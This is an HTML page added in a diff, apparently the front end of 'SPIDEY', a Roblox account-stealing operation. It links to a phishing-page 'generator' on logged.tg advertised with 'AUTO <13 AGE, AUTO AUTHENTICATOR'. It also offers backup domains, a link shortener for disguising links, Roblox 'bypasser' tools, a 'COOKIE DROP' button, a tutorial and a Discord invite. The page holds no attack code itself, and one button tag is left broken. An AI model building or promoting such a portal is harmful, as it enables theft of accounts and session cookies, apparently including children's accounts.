@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SPIDEY</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Inter:wght@400;500&family=Applied+Sans:wght@700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Background Effects -->
+  <div class="background-effects">
+    <div class="grid-pattern"></div>
+    <div class="particles" id="particles"></div>
+  </div>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo">
+      <span class="logo-emoji"></span>
+      SPIDEY
+
+      <span class="logo-emoji"></span>
+    </div>
+  </header>
+
+  <!-- Discord Button -->
+  <a href="https://discord.gg/VtwtZSMqbD" target="_blank" class="btn btn-primary discord-btn">
+    <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" class="logo-img" alt="Discord">
+    JOIN OUR DISCORD
+  </a>
+
+  <!-- Main Content -->
+  <main class="content">
+    <!-- Generator Card -->
+    <section class="card">
+      <div class="card-header">
+        <i class="fas fa-rocket icon"></i>
+        <h2>MAIN GENERATOR</h2>
+        <i class="fas fa-rocket icon"></i>
+      </div>
+      
+      <!-- Status Indicators - Side by side with supported underneath -->
+      <div class="status-indicators">
+        <div class="status-item">
+          <div class="status-platform">TikTok -</div>
+          <div class="status-supported">
+            <i class="fas fa-check status-emoji"></i>
+            supported
+          </div>
+        </div>
+        <div class="status-item">
+          <div class="status-platform">Chrome -</div>
+          <div class="status-supported">
+            <i class="fas fa-check status-emoji"></i>
+            supported
+          </div>
+        </div>
+      </div>
+      
+      <!-- First button group (GENERATOR/AUTHOR) -->
+      <div class="main-generator-buttons">
+        <button class="btn btn-primary" onclick="openGeneratorModal()">
+          <i class="fas fa-bolt"></i>
+          GENERATOR
+        </button>
+        <button class="btn btn-primary" onclick="window.location.href='author.html'">
+          <i class="fas fa-code"></i>
+          AUTOHAR
+        </button>
+      </div>
+      
+      <!-- Second button group (3 buttons) -->
+      <div class="three-button-group">
+        <button class="btn btn-secondary" onclick="window.location.href='shortener.html'">
+          <i class="fas fa-link"></i>
+          HYPERLINK
+        </button>
+        <button class="btn btn-secondary" onclick="showBypasserOptions()">
+          <i class="fas fa-chevron-down"></i>
+          BYPASSER
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="14" height="14" style="margin-left: 4px;">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+          </svg>
+        </button>
+        <button class="btn btn-secondary" onclick="window.open('', '_blank')">
+          <i class="fas fa-cookie-bite"></i>
+          COOKIE DROP
+        </button>
+      </div>
+      
+      <div class="bypasser-container">
+        <div class="bypasser-options" id="bypasserOptions">
+          <div class="bypasser-option" onclick="selectBypasser(1)">BYPASSER 1</div>
+          <div class="bypasser-option" onclick="selectBypasser(2)">BYPASSER 2</div>
+        </div>
+        
+        <button class="btn btn-primary" id="goToBypasser" onclick="goToBypasser()"> 
+        <button class="btn btn-primary" onclick="window.open('http://dayonerblx.com/RBLX-Bypasser/', '_blank')">
+          GO TO BYPASSER
+        </button>
+      </div>
+      
+      <p class="note">
+        <i class="fas fa-exclamation-triangle icon"></i>
+        If sites are down or flagged, please be patient as we're working to fix them ASAP
+      </p>
+    </section>
+
+    <!-- Tutorial Card -->
+    <section class="card">
+      <div class="card-header">
+        <i class="fas fa-graduation-cap icon"></i>
+        <h2>TUTORIAL</h2>
+        <i class="fas fa-graduation-cap icon"></i>
+      </div>
+      
+      <div class="tutorial-container">
+        <button class="btn btn-primary tutorial-btn" onclick="window.location.href='tutorial.html'">
+          <i class="fas fa-play"></i>
+          TUTORIAL
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
+          </svg>
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <!-- Generator Modal -->
+  <div class="modal" id="generatorModal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <i class="fas fa-link"></i>
+        SELECT DOMAIN
+      </div>
+      <div class="modal-options">
+        <div class="modal-option" onclick="window.open('https://www.logged.tg/auth/spideymannn', '_blank')">
+          <div class="badge">OP</div>
+          <div class="option-title">
+            <i class="fas fa-globe"></i>
+            Main Site
+          </div>
+          <div class="option-desc">AUTO <13 AGE, AUTO AUTHENTICATOR</div>
+        </div>
+        
+        <div class="modal-option" onclick="window.location.href='domain.html'">
+          <div class="option-title">
+            <i class="fas fa-shield-alt"></i>
+            Backup Domains
+          </div>
+          <div class="option-desc">USE IF MAIN SITE IS DOWN OR IN MAINTENANCE</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scroll to Top Button -->
+  <button class="scroll-top" id="scrollTopBtn" onclick="scrollToTop()">
+    <i class="fas fa-arrow-up"></i>
+  </button>
+
+  <script src="script.js"></script>
+</body>
+</html>
